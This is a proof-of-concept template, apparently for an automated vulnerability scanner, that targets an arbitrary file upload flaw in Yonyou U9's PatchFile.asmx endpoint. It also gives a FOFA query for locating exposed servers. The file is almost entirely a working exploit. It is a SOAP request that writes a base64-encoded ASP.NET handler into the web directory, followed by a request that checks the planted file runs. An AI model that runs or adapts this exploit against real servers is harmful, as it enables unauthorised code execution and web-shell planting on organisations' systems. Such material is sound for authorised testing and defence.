VEID/2024/VEID-2024-0507.poc

## id: VEID-2024-0507
## name: 用友U9-PatchFile.asmx接口存在任意文件上传漏洞
## author: hack007x
## severity: critical
## tags: veid,rce,veid2024
## description: 用友U9聚焦中型和中大型制造企业，全面支持业财税档一体化、设计制造一体化、计划执行一体化、营销服务一体化、项目制造一体化等数智制造场景，赋能组织变革和商业创新，融合产业互联网资源实现连接、共享、协同，助力制造企业高质量发展。
## fofa-query: body="logo-u9.png"
## verification: true



POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
SOAPAction: "http://tempuri.org/SaveFile"
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?>
 <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
   <SaveFile xmlns="http://tempuri.org/">
    <binData>PCUgQCB3ZWJoYW5kbGVyIGxhbmd1YWdlPSJDIyIgY2xhc3M9IkF2ZXJhZ2VIYW5kbGVyIiAlPiAKdXNpbmcgU3lzdGVtOyAKdXNpbmcgU3lzdGVtLldlYjsgCgpwdWJsaWMgY2xhc3MgQXZlcmFnZUhhbmRsZXIgOiBJSHR0cEhhbmRsZXIgCnsgCiAgICBwdWJsaWMgYm9vbCBJc1JldXNhYmxlIAogICAgeyAKICAgICAgICBnZXQgewogICAgICAgICAgICAgcmV0dXJuIHRydWU7IAogICAgICAgICAgICB9IAogICAgICAgIH0gCiAgICAgICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY3R4KSAKICAgICAgICB7IAogICAgICAgICAgICBjdHguUmVzcG9uc2UuV3JpdGUoImhlbGxvIHZlaWwiKTsgCiAgICAgICAgfSAKICAgIH0=</binData>
    <path>./</path>
    <fileName>a.ashx</fileName>
   </SaveFile>
  </soap:Body>
 </soap:Envelope>

#@ condition: and
#@ matcher: body contains "<?xml"
#@ matcher: status_code == 200

---

GET /CS/Office/AutoUpdates/a.ashx HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}

#@ matcher: body contains "hello veil"





# @VEIL-STAMP: 8b7778a0aff090488acf3aa8b832e0324b84eda9adf41b73ba4cc6612c1e9eff
